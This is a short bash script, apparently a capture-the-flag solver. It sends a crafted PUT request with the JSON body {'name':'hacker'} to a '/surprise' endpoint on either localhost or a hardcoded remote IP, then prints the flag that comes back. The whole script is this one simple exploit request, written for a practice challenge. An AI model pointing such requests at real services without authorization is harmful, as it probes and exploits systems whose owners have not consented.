#!/bin/bash
PORT=8093

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.157:'$PORT
else
    url=$1':'$2
fi

# Surprise
echo "Start exploit for Suprise"
url=$url'/surprise'
echo $url
flag=$(curl -s --request PUT --header "Content-Type: application/json" --data '{"name":"hacker"}' $url | tail -n 1)
echo "Flag is $flag"
echo "-------------------------"
